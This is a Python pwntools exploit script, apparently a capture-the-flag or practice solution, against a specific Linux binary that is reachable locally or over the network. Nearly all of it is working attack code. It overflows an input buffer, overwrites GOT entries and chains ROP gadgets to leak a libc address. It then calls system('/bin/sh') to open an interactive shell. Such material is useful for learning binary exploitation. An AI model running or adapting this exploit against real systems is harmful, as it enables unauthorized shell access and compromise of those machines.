#!/usr/bin/env python3

# author: greyshell
# description: exploit canary bypass v02

import argparse

from pwn import *

context(os='linux', arch='amd64')
# run the local binary in tmux session
context.terminal = ['tmux', 'splitw', '-h']


class UserInput:
    def __init__(self):
        # create the top-level parser
        self.parser = argparse.ArgumentParser(
            description="linux binary exploitation")

        # optional arguments
        self.parser.add_argument("-m", "--debug_mode", metavar="", choices=["true", "false"],
                                 help="enable the debug mode, choices = {true, false}, default=false")

        # based on the dest argument subparsers will be selected
        self.subparsers = self.parser.add_subparsers(title="commands", dest="command",
                                                     help="[command] --help for more details")

        # create a sub parser for the local binary
        self.local_parser = self.subparsers.add_parser("local", description="exploit local binary",
                                                       help="exploit local binary")
        self.local_parser.add_argument("-b", "--binary", metavar="",
                                       help="provide the binary kept in the same directory",
                                       required=True)
        self.local_parser.add_argument("-g", "--gdb", metavar="", choices=['true', 'false'],
                                       help="attach gdb in tmux session, choices = {true, false}, default=false")
        self.local_parser.set_defaults(func='local')

        # create a sub parser for the binary running on network
        self.local_parser = self.subparsers.add_parser("network", description="exploit network binary",
                                                       help="exploit network binary")
        self.local_parser.add_argument("-i", "--ip_address", metavar="",
                                       help="provide ip_address",
                                       required=True)
        self.local_parser.add_argument("-p", "--port", metavar="",
                                       help="provide port",
                                       required=True)
        self.local_parser.set_defaults(func='network')


# noinspection PyUnresolvedReferences,PyUnresolvedReferences
def exploit(conn):
    """
    exploit code
    :param conn:
    :return:
    """
    conn.recvuntil("name:\n")  # receive bytes till name:
    input_name = ("A" * 24).encode()
    # heap_pointer = overwrite from .GOT puts() last byte => 0x000000000060101f
    input_name += p64(0x000000000060101f)
    # pad address = 0x00000000004008c3 : pop rdi ; ret
    input_name += p64(0x00000000004008c3)
    # canary: argument of `puts()` => `0000000000601030` -> .GOT malloc()
    input_name += p64(0x0000000000601030)
    # EBP = PLT address of puts => `0000000000400610`
    input_name += p64(0x0000000000400610)
    # some return address: address of main(), last byte = null
    input_name += p64(0x00000000004007b8)
    #  strip the last byte, sendline() will add \n and it will be treated as null byte
    conn.sendline(input_name[:-1])

    conn.recvuntil("description:\n")  # receive bytes till description:
    input_des = "\x00".encode()  # fixing the puts() GOT last byte
    # 0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    input_des += p64(0x00000000004008bb)
    # sendline() will add \n at the end, the \n will overwrite memset() GOT 1st byte
    # as memset is not used in the code later so it should not be any issue
    # 0x00000000004008bb => last byte is null.
    # strip last byte, due to \n, a null will be added automatically
    conn.sendline(input_des[:-1])

    # as libc address last two bytes are null
    libc_leak = u64(conn.recvn(6) + '\x00\x00'.encode())
    print("[+] libc_address => malloc(): ", hex(libc_leak))

    # system() = 0x7fda54b0f390
    system_offset = 0x7fda54b0f390 - 0x7fda54b4e130
    system_address = libc_leak + system_offset

    # /bin/sh => 0x7fda54c56d57
    bin_sh_offset = 0x7fda54c56d57 - 0x7fda54b4e130
    bin_sh_address = libc_leak + bin_sh_offset

    # loop back to main()
    conn.recvuntil("name:\n")  # receive bytes till name:
    input_name = ("A" * 24).encode()
    # heap_pointer = overwrite from .GOT puts() last byte => 0x000000000060101f
    input_name += p64(0x000000000060101f)
    # pad address = 0x00000000004008c3 : pop rdi ; ret
    input_name += p64(0x00000000004008c3)
    # canary: argument of system() => '/bin/sh'
    input_name += p64(bin_sh_address)
    input_name += p64(system_address)  # RBP: call system()

    conn.sendline(input_name)  # a null will be added automatically

    conn.recvuntil("description:\n")  # receive bytes till description:
    input_des = "\x00".encode()  # fixing the puts() GOT last byte
    # 0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    input_des += p64(0x00000000004008bb)
    # To prevent overwriting memset's got's first byte
    conn.sendline(input_des[:-1])

    # make the connection interactive
    conn.interactive()


def main():
    my_input = UserInput()
    arguments = my_input.parser.parse_args()
    connection = ""

    # run the script without any argument
    if len(sys.argv) == 1:
        my_input.parser.print_help(sys.stderr)
        sys.exit(1)

    # exploiting local binary
    if arguments.command == 'local':
        binary_name = "./"
        binary_name += arguments.binary
        connection = process([binary_name])
        # attach the binary with gdb in tmux session
        if arguments.gdb == 'true':
            gdb.attach(connection)

    elif arguments.command == 'network':
        connection = remote(arguments.ip_address, arguments.port)

    if arguments.debug_mode == 'true':
        context.log_level = 'debug'

    # invoke the exploit function
    exploit(connection)


if __name__ == '__main__':
    main()
